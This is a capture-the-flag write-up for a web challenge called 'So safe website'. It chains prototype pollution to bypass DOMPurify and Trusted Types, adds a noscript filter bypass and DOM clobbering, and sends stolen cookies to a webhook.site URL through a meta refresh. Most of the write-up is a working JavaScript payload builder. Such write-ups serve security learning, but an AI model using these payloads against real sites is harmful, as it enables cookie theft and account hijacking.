# So safe website
- Number of solves: 1

1. Overwrite Object object's getOwnPropertyNames with "nice feature" to bypass dompurify + trusted types.
`{"name":{"__proto__":{"__proto__":{"constructor":{"getOwnPropertyNames":"B"}}}}}`
2. Bypass custom filter with `noscript` tag. example:
`<noscript><img src="</noscript><img src=1 onerror=alert()">`
3. Steal cookies with `debug.js` and set parent's name to cookies and do redirect with meta tag
4. Send `window.name` to your webhook.
```js
var ppPayload = `{"name":{"__proto__":{"__proto__":{"constructor":{"getOwnPropertyNames":"B"}}}}}`;
var customFilterBypass = `
<noscript>
        <img/id="
             </noscript><img><iframe/srcdoc='HTMLINJ'></iframe><meta/http-equiv='refresh'/content='1;url=https://webhook.site/6-b79f993da3a' />
        ">
</noscript>`.replace(/\n/g,"").replace(/ /g,"").replace(/\t/g,"");
var domclobbering = `
<iframe srcdoc="NEXT" name="debugOptions"></iframe><link href="/ff" rel="stylesheet"><link href="/qqq" rel="stylesheet"><link href="/ffds" rel="stylesheet"><link href="/df" re>
`.replace(/"/g,"&quot;");
domclobbering = domclobbering.replace("NEXT",`
<iframe srcdoc="NEXT" name="0"></iframe>
`).replace(/"/g,"&amp;quot;")

domclobbering = domclobbering.replace("NEXT",`
<br id="0" clear="parent"><font id="1" face="name"><object id="2" code="document"></object><input id="3" accept="cookie">
`.replace(/"/g,"&amp;amp;quot;"));

customFilterBypass = customFilterBypass.replace("HTMLINJ",domclobbering).replace(/\n/g,"").replace(/ /g,"/");

console.log(`http://sosafewebsite.peykar.io:7070/?name=${encodeURIComponent(customFilterBypass)}&wow=${encodeURIComponent(ppPayload)}`);
```


